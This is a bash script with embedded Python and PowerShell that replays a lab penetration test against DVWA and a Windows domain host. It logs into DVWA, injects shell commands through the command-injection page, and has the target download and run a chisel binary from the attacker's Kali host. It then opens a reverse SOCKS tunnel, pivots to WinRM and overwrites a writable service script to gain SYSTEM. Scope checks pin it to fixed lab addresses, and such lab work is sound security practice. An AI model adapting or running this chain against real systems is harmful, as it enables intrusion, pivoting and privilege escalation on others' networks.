#!/usr/bin/env bash
set -Eeuo pipefail

run_id="${1:-}"
kali_address="${2:-}"
dvwa_address="${3:-}"
dvwa_port="${4:-}"
windows_address="${5:-}"
windows_port="${6:-}"
domain_user="${7:-}"
user_sid="${8:-}"
static_chisel_path="${9:-}"
static_chisel_sha256="${10:-}"
proxy_config="${11:-}"
service_name="${12:-}"
service_executable="${13:-}"
vulnerable_script="${14:-}"
proof_artifact="${15:-}"
event_source="${16:-}"
marker="${17:-}"

callback_port='443'
dmz_socks_port='1080'
psrp_python='/home/kali/.local/share/pb05-replay/venv/bin/python'

if [[ ! "$run_id" =~ ^PTR-[0-9]{8}T[0-9]{6}Z-[0-9a-f]{8}$ ||
      "$kali_address" != '192.168.111.144' ||
      "$dvwa_address" != '192.168.111.128' ||
      "$dvwa_port" != '8080' ||
      "$windows_address" != '10.10.30.20' ||
      "$windows_port" != '5985' ||
      "$domain_user" != 'LAB\svc_web' ||
      "$user_sid" != 'S-1-5-21-722403993-16450863-2166090910-1106' ||
      "$static_chisel_path" != '/home/kali/pfa-evidence/phase3-pivot/chisel-static' ||
      "$proxy_config" != '/home/kali/pfa-evidence/phase3-pivot/proxychains-dmz.conf' ||
      "$service_name" != 'PFA-Lab-Updater' ||
      "$service_executable" != 'C:\Program Files\PFA-Lab\PFA-Lab-Updater.exe' ||
      "$vulnerable_script" != 'C:\ProgramData\PFA-Lab\PrivilegeEscalation\PFA-Lab-Updater.ps1' ||
      "$proof_artifact" != 'C:\ProgramData\PFA-Lab\PrivilegeEscalation\system-proof.json' ||
      "$event_source" != 'PFA-Lab-PrivilegeEscalation' ||
      "$marker" != 'PFA_SERVICE_PRIVESC_01' ]]; then
    printf 'LIVE_STATUS=REFUSED_OUTSIDE_DOCUMENTED_PRIVESC_SCOPE\n'
    exit 70
fi

umask 077
cookie_jar="$(mktemp /tmp/privesc-dvwa-cookies.XXXXXX)"
login_page="$(mktemp /tmp/privesc-dvwa-login.XXXXXX)"
auth_page="$(mktemp /tmp/privesc-dvwa-auth.XXXXXX)"
exec_page="$(mktemp /tmp/privesc-dvwa-exec.XXXXXX)"
http_pid=''
chisel_pid=''
chisel_started_here=0
completed=0

is_listening() {
    local port="$1"
    ss -lntH | awk '{print $4}' | grep -Eq "(^|:)${port}$"
}

stop_root_pid() {
    local pid="$1"
    if [[ -n "$pid" && "$pid" =~ ^[0-9]+$ ]]; then
        sudo -n kill "$pid" >/dev/null 2>&1 || true
        for _ in 1 2 3 4 5; do
            sudo -n kill -0 "$pid" >/dev/null 2>&1 || return 0
            sleep 1
        done
        sudo -n kill -KILL "$pid" >/dev/null 2>&1 || true
    fi
}

cleanup() {
    unset dvwa_password windows_password 2>/dev/null || true
    stop_root_pid "$http_pid"
    if [[ "$completed" -ne 1 && "$chisel_started_here" -eq 1 ]]; then
        stop_root_pid "$chisel_pid"
    fi
    rm -f -- "$cookie_jar" "$login_page" "$auth_page" "$exec_page"
}
trap cleanup EXIT

for tool in curl grep awk sha256sum python3 proxychains4 nc ss sudo; do
    if ! command -v "$tool" >/dev/null 2>&1; then
        printf 'MISSING_TOOL=%s\n' "$tool"
        printf 'LIVE_STATUS=MISSING_REQUIRED_TOOL\n'
        exit 71
    fi
done

if [[ ! -x "$psrp_python" ]] || ! "$psrp_python" -c 'import pypsrp' >/dev/null 2>&1; then
    printf 'PYPSRP_PREREQUISITE=MISSING:%s\n' "$psrp_python"
    printf 'LIVE_STATUS=MISSING_REQUIRED_TOOL\n'
    exit 71
fi
if [[ ! -x "$static_chisel_path" ]] ||
   [[ "$(sha256sum "$static_chisel_path" | awk '{print $1}')" != "$static_chisel_sha256" ]]; then
    printf 'LIVE_STATUS=STATIC_CHISEL_VALIDATION_FAILED\n'
    exit 72
fi
if ! grep -Eq '^socks5[[:space:]]+127\.0\.0\.1[[:space:]]+1080[[:space:]]*$' "$proxy_config"; then
    printf 'LIVE_STATUS=PROXY_CONFIG_VALIDATION_FAILED\n'
    exit 73
fi

printf 'The controlled privilege-escalation replay needs Kali sudo, DVWA admin, and LAB\\svc_web credentials.\n'
printf '\n[1/3] Kali sudo authentication\n'
sudo -v </dev/tty

printf '\n[2/3] DVWA web authentication\n'
read -rsp 'Enter DVWA admin password: ' dvwa_password </dev/tty
printf '\n'
dvwa_password="${dvwa_password%$'\r'}"

target="http://${dvwa_address}:${dvwa_port}"
curl -fsS -c "$cookie_jar" "$target/login.php" -o "$login_page"
token="$(grep -oP "name=['\"]user_token['\"] value=['\"]\K[^'\"]+" "$login_page" | head -n 1 || true)"
if [[ -z "$token" ]]; then
    printf 'LIVE_STATUS=DVWA_TOKEN_NOT_FOUND\n'
    exit 74
fi

printf '%s' "$dvwa_password" | curl -fsS -L \
    -b "$cookie_jar" -c "$cookie_jar" \
    --data-urlencode 'username=admin' \
    --data-urlencode 'password@-' \
    --data-urlencode 'Login=Login' \
    --data-urlencode "user_token=$token" \
    "$target/login.php" -o "$auth_page"
unset dvwa_password token

curl -fsS -b "$cookie_jar" -b 'security=low' \
    "$target/vulnerabilities/exec/" -o "$exec_page"
if ! grep -Eqi 'Command Injection|Ping a device|vulnerabilities/exec' "$exec_page"; then
    printf 'LIVE_STATUS=DVWA_AUTHENTICATION_FAILED\n'
    exit 75
fi
printf 'DVWA_AUTHENTICATION=VERIFIED\n'

printf '\n[3/3] Windows domain authentication\n'
read -rsp 'Enter LAB\\svc_web password: ' windows_password </dev/tty
printf '\n'
windows_password="${windows_password%$'\r'}"

dvwa_exec() {
    local command="$1"
    local output_path="$2"
    curl -fsS --max-time 60 \
        -b "$cookie_jar" -b 'security=low' \
        -A "PFA-PRIVESC-REPLAY-${run_id}" \
        --data-urlencode "ip=127.0.0.1; ${command}" \
        --data-urlencode 'Submit=Submit' \
        "$target/vulnerabilities/exec/" -o "$output_path"
}

dvwa_exec 'if [ -x /tmp/chisel ]; then sha256sum /tmp/chisel; else echo CHISEL_MISSING; fi' "$exec_page"
if grep -qi "$static_chisel_sha256" "$exec_page"; then
    printf 'DMZ_CHISEL=ALREADY_PRESENT_AND_VERIFIED\n'
else
    if is_listening "$callback_port"; then
        printf 'LIVE_STATUS=CALLBACK_PORT_IN_USE_AND_TRANSFER_REQUIRED\n'
        exit 76
    fi
    static_directory="$(dirname "$static_chisel_path")"
    http_log="/tmp/privesc-http-${run_id}.log"
    http_pid="$(sudo -n sh -c "nohup python3 -m http.server '$callback_port' --bind 0.0.0.0 --directory '$static_directory' >'$http_log' 2>&1 & echo \$!")"
    for _ in 1 2 3 4 5 6 7 8 9 10; do
        is_listening "$callback_port" && break
        sleep 1
    done
    if ! is_listening "$callback_port"; then
        printf 'LIVE_STATUS=TEMPORARY_TRANSFER_SERVER_FAILED\n'
        exit 77
    fi
    transfer_command="php -r 'copy(\"http://${kali_address}:${callback_port}/$(basename "$static_chisel_path")\",\"/tmp/chisel\");'; chmod +x /tmp/chisel; sha256sum /tmp/chisel"
    dvwa_exec "$transfer_command" "$exec_page"
    if ! grep -qi "$static_chisel_sha256" "$exec_page"; then
        printf 'LIVE_STATUS=DMZ_CHISEL_TRANSFER_VALIDATION_FAILED\n'
        exit 78
    fi
    printf 'DMZ_CHISEL=TRANSFERRED_AND_VERIFIED\n'
    stop_root_pid "$http_pid"
    http_pid=''
fi

if is_listening "$callback_port"; then
    if ! pgrep -af -- "$static_chisel_path server --reverse --port $callback_port" >/dev/null 2>&1; then
        printf 'LIVE_STATUS=CALLBACK_PORT_OWNED_BY_UNEXPECTED_PROCESS\n'
        exit 79
    fi
    printf 'KALI_CHISEL_SERVER=REUSED\n'
else
    server_log="/home/kali/pfa-evidence/phase3-pivot/privesc-replay-${run_id}.log"
    chisel_pid="$(sudo -n sh -c "nohup '$static_chisel_path' server --reverse --port '$callback_port' >'$server_log' 2>&1 & echo \$!")"
    chisel_started_here=1
    for _ in 1 2 3 4 5 6 7 8 9 10; do
        is_listening "$callback_port" && break
        sleep 1
    done
    if ! is_listening "$callback_port"; then
        printf 'LIVE_STATUS=CHISEL_SERVER_START_FAILED\n'
        exit 80
    fi
    printf 'KALI_CHISEL_SERVER=STARTED:%s\n' "$server_log"
fi

if is_listening "$dmz_socks_port"; then
    printf 'DMZ_SOCKS_1080=REUSED\n'
else
    dvwa_exec "nohup /tmp/chisel client http://${kali_address}:${callback_port} R:${dmz_socks_port}:socks >/tmp/privesc-chisel-client.log 2>&1 &" "$exec_page"
    for _ in $(seq 1 20); do
        is_listening "$dmz_socks_port" && break
        sleep 1
    done
    if ! is_listening "$dmz_socks_port"; then
        printf 'LIVE_STATUS=DMZ_SOCKS_START_FAILED\n'
        exit 81
    fi
    printf 'DMZ_SOCKS_1080=STARTED\n'
fi

if ! proxychains4 -q -f "$proxy_config" nc -zvw8 "$windows_address" "$windows_port" >/dev/null 2>&1; then
    printf 'LIVE_STATUS=WINRM_UNREACHABLE_THROUGH_DMZ_SOCKS\n'
    exit 82
fi
printf 'WINRM_THROUGH_DMZ_SOCKS=VERIFIED\n'

"$psrp_python" - "$windows_address" "$windows_port" "$domain_user" "$user_sid" \
    "$service_name" "$service_executable" "$vulnerable_script" "$proof_artifact" \
    "$event_source" "$marker" 3<<<"$windows_password" <<'PYTHON'
import base64
import hashlib
import json
import os
import re
import select
import socket
import struct
import sys
import threading

from pypsrp.powershell import PowerShell, RunspacePool
from pypsrp.wsman import WSMan

(
    windows_address,
    windows_port,
    domain_user,
    user_sid,
    service_name,
    service_executable,
    vulnerable_script,
    proof_artifact,
    event_source,
    marker,
) = sys.argv[1:]

with os.fdopen(3, 'r', encoding='utf-8', errors='strict') as password_stream:
    password = password_stream.read().rstrip('\r\n')
if not password:
    print('PYPSRP_STATUS=EMPTY_PASSWORD_REFUSED')
    raise SystemExit(83)


def recv_exact(stream, count):
    data = bytearray()
    while len(data) < count:
        chunk = stream.recv(count - len(data))
        if not chunk:
            raise ConnectionError('SOCKS5_UNEXPECTED_EOF')
        data.extend(chunk)
    return bytes(data)


def open_socks_connection():
    upstream = socket.create_connection(('127.0.0.1', 1080), timeout=10)
    upstream.sendall(b'\x05\x01\x00')
    if recv_exact(upstream, 2) != b'\x05\x00':
        raise ConnectionError('SOCKS5_METHOD_NEGOTIATION_FAILED')
    upstream.sendall(
        b'\x05\x01\x00\x01'
        + socket.inet_aton(windows_address)
        + struct.pack('!H', int(windows_port))
    )
    header = recv_exact(upstream, 4)
    if header[0] != 5 or header[1] != 0:
        raise ConnectionError('SOCKS5_CONNECT_FAILED_' + str(header[1]))
    if header[3] == 1:
        recv_exact(upstream, 4)
    elif header[3] == 3:
        recv_exact(upstream, recv_exact(upstream, 1)[0])
    elif header[3] == 4:
        recv_exact(upstream, 16)
    else:
        raise ConnectionError('SOCKS5_INVALID_ADDRESS_TYPE')
    recv_exact(upstream, 2)
    upstream.settimeout(None)
    return upstream


relay_stop = threading.Event()
relay_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
relay_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
relay_listener.bind(('127.0.0.1', 0))
relay_listener.listen(16)
relay_listener.settimeout(1)
relay_port = relay_listener.getsockname()[1]


def relay_connection(client):
    upstream = None
    try:
        upstream = open_socks_connection()
        while not relay_stop.is_set():
            readable, _, _ = select.select([client, upstream], [], [], 1)
            for source in readable:
                data = source.recv(65536)
                if not data:
                    return
                destination = upstream if source is client else client
                destination.sendall(data)
    except (ConnectionError, OSError):
        return
    finally:
        try:
            client.close()
        except OSError:
            pass
        if upstream is not None:
            try:
                upstream.close()
            except OSError:
                pass


def accept_relay_connections():
    while not relay_stop.is_set():
        try:
            client, _ = relay_listener.accept()
        except socket.timeout:
            continue
        except OSError:
            return
        threading.Thread(target=relay_connection, args=(client,), daemon=True).start()


threading.Thread(target=accept_relay_connections, daemon=True).start()
print('WINRM_LOCAL_SOCKS_RELAY=LISTENING_127.0.0.1_' + str(relay_port))

response_head = ''
try:
    probe = socket.create_connection(('127.0.0.1', relay_port), timeout=10)
    probe.settimeout(20)
    probe.sendall(
        (
            'POST /wsman HTTP/1.1\r\n'
            f'Host: {windows_address}:{windows_port}\r\n'
            'Content-Length: 0\r\n'
            'Connection: close\r\n\r\n'
        ).encode('ascii')
    )
    response_head = probe.recv(4096).decode('iso-8859-1', errors='replace')
finally:
    try:
        probe.close()
    except (NameError, OSError):
        pass

status_match = re.match(r'HTTP/\d(?:\.\d)?\s+(\d{3})', response_head)
if not status_match:
    print('WINRM_HTTP_THROUGH_SOCKS_RELAY=NO_HTTP_RESPONSE')
    raise SystemExit(84)
print('WINRM_HTTP_THROUGH_SOCKS_RELAY=HTTP_' + status_match.group(1))

proof_script_text = r'''$ErrorActionPreference = 'Stop'
$Marker = '__MARKER__'
$Identity = [Security.Principal.WindowsIdentity]::GetCurrent()
$CurrentProcess = Get-CimInstance Win32_Process -Filter "ProcessId=$PID"
$SourceHash = (Get-FileHash -Algorithm SHA256 -LiteralPath $MyInvocation.MyCommand.Path).Hash
$Message = "$Marker execution_identity=$($Identity.Name) execution_sid=$($Identity.User.Value) process_id=$PID parent_process_id=$($CurrentProcess.ParentProcessId) source_sha256=$SourceHash"
$EventWriteStatus = 'NOT_ATTEMPTED'
$EventWriteError = ''
try {
    [Diagnostics.EventLog]::WriteEntry('__EVENT_SOURCE__', $Message, [Diagnostics.EventLogEntryType]::Information, 9101)
    $EventWriteStatus = 'WRITTEN'
}
catch {
    $EventWriteStatus = 'FAILED'
    $EventWriteError = $_.Exception.Message
}
$Proof = [ordered]@{
    schema_version = 'PFA_PRIVESC_PROOF_V1'
    marker = $Marker
    timestamp_utc = (Get-Date).ToUniversalTime().ToString('o')
    execution_identity = $Identity.Name
    execution_sid = $Identity.User.Value
    process_id = $PID
    parent_process_id = [int] $CurrentProcess.ParentProcessId
    service_name = '__SERVICE_NAME__'
    source_script = $MyInvocation.MyCommand.Path
    source_script_sha256 = $SourceHash
    application_event_write_status = $EventWriteStatus
    application_event_write_error = $EventWriteError
}
$Json = $Proof | ConvertTo-Json -Depth 4
[IO.File]::WriteAllText('__PROOF_PATH__', $Json, (New-Object Text.UTF8Encoding($false)))
'''
proof_script_text = proof_script_text.replace('__MARKER__', marker)
proof_script_text = proof_script_text.replace('__SERVICE_NAME__', service_name)
proof_script_text = proof_script_text.replace('__PROOF_PATH__', proof_artifact)
proof_script_text = proof_script_text.replace('__EVENT_SOURCE__', event_source)
proof_script_text = proof_script_text.replace('\n', '\r\n') + '\r\n'
proof_script_bytes = proof_script_text.encode('utf-8')
proof_script_b64 = base64.b64encode(proof_script_bytes).decode('ascii')
proof_script_sha256 = hashlib.sha256(proof_script_bytes).hexdigest().upper()

payload = r'''
$ErrorActionPreference = 'Stop'
Write-Output 'PRIVESC_REMOTE_STAGE=IDENTITY_VALIDATION'
$Identity = [Security.Principal.WindowsIdentity]::GetCurrent()
if ($Identity.User.Value -ne '__USER_SID__') { throw 'PRIVESC_USER_SID_MISMATCH' }
$ServiceName = '__SERVICE_NAME__'
$ServiceExecutable = '__SERVICE_EXECUTABLE__'
$VulnerableScript = '__VULNERABLE_SCRIPT__'
$ProofArtifact = '__PROOF_ARTIFACT__'
$Marker = '__MARKER__'

Write-Output 'PRIVESC_REMOTE_STAGE=FIXTURE_VALIDATION'
if (-not (Test-Path -LiteralPath $VulnerableScript -PathType Leaf)) { throw 'PRIVESC_VULNERABLE_SCRIPT_MISSING' }
if (Test-Path -LiteralPath $ProofArtifact) { throw 'PRIVESC_STALE_PROOF_PRESENT_RUN_ELEVATED_RESET' }
$BeforeText = [IO.File]::ReadAllText($VulnerableScript)
if ($BeforeText -notmatch 'PFA_PRIVESC_BASELINE_V1') { throw 'PRIVESC_BASELINE_MARKER_MISSING_RUN_ELEVATED_RESET' }
$BeforeHash = (Get-FileHash -Algorithm SHA256 -LiteralPath $VulnerableScript).Hash
$BeforeAcl = (Get-Acl -LiteralPath $VulnerableScript).Sddl
$ServiceQuery = (& sc.exe qc $ServiceName 2>&1 | Out-String)
if ($LASTEXITCODE -ne 0) { throw 'PRIVESC_SERVICE_QUERY_FAILED' }
if ($ServiceQuery -notlike ('*' + $ServiceExecutable + '*')) { throw 'PRIVESC_SERVICE_EXECUTABLE_MISMATCH' }
$Service = Get-Service -Name $ServiceName -ErrorAction Stop
if ($Service.Status -ne 'Stopped') { throw 'PRIVESC_SERVICE_NOT_RESET_TO_STOPPED' }

Write-Output 'PRIVESC_REMOTE_STAGE=WRITE_VULNERABLE_SERVICE_SCRIPT'
$WriteStartedUtc = (Get-Date).ToUniversalTime()
[IO.File]::WriteAllBytes($VulnerableScript, [Convert]::FromBase64String('__SCRIPT_BYTES_B64__'))
$AfterHash = (Get-FileHash -Algorithm SHA256 -LiteralPath $VulnerableScript).Hash
if ($AfterHash -ne '__SCRIPT_SHA256__') { throw 'PRIVESC_PAYLOAD_HASH_MISMATCH' }
$ModifiedUtc = (Get-Item -LiteralPath $VulnerableScript).LastWriteTimeUtc

Write-Output 'PRIVESC_REMOTE_STAGE=START_LAB_SERVICE'
$ServiceStartRequestedUtc = (Get-Date).ToUniversalTime()
Start-Service -Name $ServiceName -ErrorAction Stop

Write-Output 'PRIVESC_REMOTE_STAGE=WAIT_FOR_SYSTEM_PROOF'
$Deadline = (Get-Date).AddSeconds(45)
while (-not (Test-Path -LiteralPath $ProofArtifact -PathType Leaf)) {
    if ((Get-Date) -ge $Deadline) { throw 'PRIVESC_SYSTEM_PROOF_TIMEOUT' }
    Start-Sleep -Milliseconds 500
}
$Proof = Get-Content -LiteralPath $ProofArtifact -Raw | ConvertFrom-Json
if ($Proof.marker -ne $Marker) { throw 'PRIVESC_PROOF_MARKER_MISMATCH' }
if ($Proof.execution_sid -ne 'S-1-5-18') { throw 'PRIVESC_EXECUTOR_NOT_SYSTEM' }
if ($Proof.service_name -ne $ServiceName) { throw 'PRIVESC_PROOF_SERVICE_MISMATCH' }
if ($Proof.source_script_sha256 -ne $AfterHash) { throw 'PRIVESC_PROOF_SCRIPT_HASH_MISMATCH' }

Write-Output 'PRIVESC_REMOTE_STAGE=CHECK_SUPPLEMENTAL_APPLICATION_EVENT'
$ProofTime = [DateTime]::Parse($Proof.timestamp_utc).ToUniversalTime()
$ProofEvent = $null
$EventDeadline = (Get-Date).AddSeconds(15)
while ($null -eq $ProofEvent -and (Get-Date) -lt $EventDeadline) {
    $ProofEvent = Get-WinEvent -FilterHashtable @{
        LogName = 'Application'
        ProviderName = '__EVENT_SOURCE__'
        Id = 9101
        StartTime = $ServiceStartRequestedUtc.AddSeconds(-5)
    } -MaxEvents 1 -ErrorAction SilentlyContinue
    if ($null -eq $ProofEvent) { Start-Sleep -Milliseconds 500 }
}
$ApplicationEventObserved = $null -ne $ProofEvent -and $ProofEvent.Message -like ('*' + $Marker + '*')
$ApplicationEventRecordId = if ($ApplicationEventObserved) { [long] $ProofEvent.RecordId } else { $null }

$Service.Refresh()
$State = [ordered]@{
    schema_version = 'PFA_PRIVESC_REPLAY_V1'
    marker = $Marker
    writer_identity = $Identity.Name
    writer_sid = $Identity.User.Value
    write_started_utc = $WriteStartedUtc.ToString('o')
    file_modified_utc = $ModifiedUtc.ToString('o')
    vulnerable_script = $VulnerableScript
    vulnerable_script_before_sha256 = $BeforeHash
    vulnerable_script_after_sha256 = $AfterHash
    vulnerable_script_acl_sddl = $BeforeAcl
    service_name = $ServiceName
    service_executable = $ServiceExecutable
    service_start_requested_utc = $ServiceStartRequestedUtc.ToString('o')
    service_status_after_proof = [string] $Service.Status
    executor_identity = [string] $Proof.execution_identity
    executor_sid = [string] $Proof.execution_sid
    system_process_id = [int] $Proof.process_id
    system_parent_process_id = [int] $Proof.parent_process_id
    proof_artifact = $ProofArtifact
    proof_timestamp_utc = $ProofTime.ToString('o')
    application_event_write_status = [string] $Proof.application_event_write_status
    application_event_write_error = [string] $Proof.application_event_write_error
    application_event_observed_by_attacker = [bool] $ApplicationEventObserved
    application_event_record_id = $ApplicationEventRecordId
    application_event_id = if ($ApplicationEventObserved) { [int] $ProofEvent.Id } else { $null }
    expected_later_telemetry = @('Security 4663 file write by LAB\svc_web', 'Security 4688 service wrapper to SYSTEM PowerShell', 'PowerShell 4104 proof script', 'System 7036 service state', 'Application 9101 SYSTEM proof')
}
$Json = $State | ConvertTo-Json -Depth 6 -Compress
$Encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($Json))
Write-Output "PRIVESC_REMOTE_STATE_B64=$Encoded"
'''

replacements = {
    '__USER_SID__': user_sid,
    '__SERVICE_NAME__': service_name,
    '__SERVICE_EXECUTABLE__': service_executable,
    '__VULNERABLE_SCRIPT__': vulnerable_script,
    '__PROOF_ARTIFACT__': proof_artifact,
    '__EVENT_SOURCE__': event_source,
    '__MARKER__': marker,
    '__SCRIPT_BYTES_B64__': proof_script_b64,
    '__SCRIPT_SHA256__': proof_script_sha256,
}
for key, value in replacements.items():
    payload = payload.replace(key, value)


def decode_output(value):
    if isinstance(value, bytes):
        return value.decode('utf-8', errors='replace')
    return str(value or '')


def safe_detail(value):
    detail = decode_output(value)
    if password:
        detail = detail.replace(password, '<REDACTED>')
    detail = detail.replace(domain_user, '<DOMAIN_USER>')
    detail = re.sub(r'[\r\n]+', ' | ', detail).strip()
    return re.sub(r'[^\x20-\x7e]', '?', detail)[-700:]


wsman = WSMan(
    server='127.0.0.1',
    port=relay_port,
    path='wsman',
    ssl=False,
    auth='ntlm',
    username=domain_user,
    password=password,
    cert_validation=False,
    encryption='auto',
    connection_timeout=30,
    read_timeout=180,
    operation_timeout=170,
    no_proxy=True,
)
pool = RunspacePool(wsman, configuration_name='Microsoft.PowerShell')
pool_opened = False
try:
    print('PYPSRP_STATUS=CONNECTING_MICROSOFT_POWERSHELL')
    pool.open()
    pool_opened = True
    print('PYPSRP_STATUS=AUTHENTICATED')
    ps = PowerShell(pool)
    ps.add_script(payload)
    output = ps.invoke()
    output_text = '\n'.join(str(item) for item in output)
    if ps.had_errors:
        error_text = '\n'.join(str(item) for item in ps.streams.error)
        stages = re.findall(r'PRIVESC_REMOTE_STAGE=([A-Z0-9_]+)', output_text)
        if stages:
            print('PRIVESC_REMOTE_FAILURE_STAGE=' + stages[-1])
        detail = safe_detail(error_text or output_text)
        if detail:
            print('PYPSRP_REMOTE_ERROR=' + detail)
        print('PYPSRP_STATUS=REMOTE_APPLY_FAILED')
        raise SystemExit(85)

    state_match = re.search(r'PRIVESC_REMOTE_STATE_B64=([A-Za-z0-9+/=]+)', output_text)
    if not state_match:
        detail = safe_detail(output_text)
        if detail:
            print('PYPSRP_REMOTE_OUTPUT=' + detail)
        print('PYPSRP_STATUS=REMOTE_STATE_MISSING')
        raise SystemExit(85)
    state = json.loads(base64.b64decode(state_match.group(1)).decode('utf-8'))
except SystemExit:
    raise
except Exception as exc:
    print('PYPSRP_EXCEPTION=' + type(exc).__name__)
    detail = safe_detail(exc)
    if detail:
        print('PYPSRP_EXCEPTION_DETAIL=' + detail)
    print('PYPSRP_STATUS=CONNECTION_OR_EXECUTION_FAILED')
    raise SystemExit(86)
finally:
    password = ''
    if pool_opened:
        try:
            pool.close()
        except Exception:
            pass
    try:
        wsman.close()
    except Exception:
        pass
    relay_stop.set()
    try:
        relay_listener.close()
    except OSError:
        pass

print('PRIVESC_WRITER_IDENTITY=' + state['writer_identity'])
print('PRIVESC_EXECUTOR_IDENTITY=' + state['executor_identity'])
print('PRIVESC_APPLICATION_EVENT_WRITE_STATUS=' + state['application_event_write_status'])
print('PRIVESC_APPLICATION_EVENT_OBSERVED_BY_ATTACKER=' + str(state['application_event_observed_by_attacker']).upper())
print('PRIVESC_WINDOWS_STATE=' + json.dumps(state, sort_keys=True, separators=(',', ':')))
print('PYPSRP_STATUS=COMPLETED')
PYTHON
unset windows_password

printf 'IDENTITY_TRANSITION=LAB\\svc_web_TO_NT_AUTHORITY\\SYSTEM_VERIFIED\n'
printf 'ATTACK_CHAIN_BOUNDARY=SVC_WEB_TO_SYSTEM_PROVED\n'
printf 'MONITORING_AND_RESPONSE=OUT_OF_SCOPE_NOT_STARTED\n'
printf 'LIVE_STATUS=WINDOWS_SERVICE_PRIVESC_COMPLETED\n'
completed=1
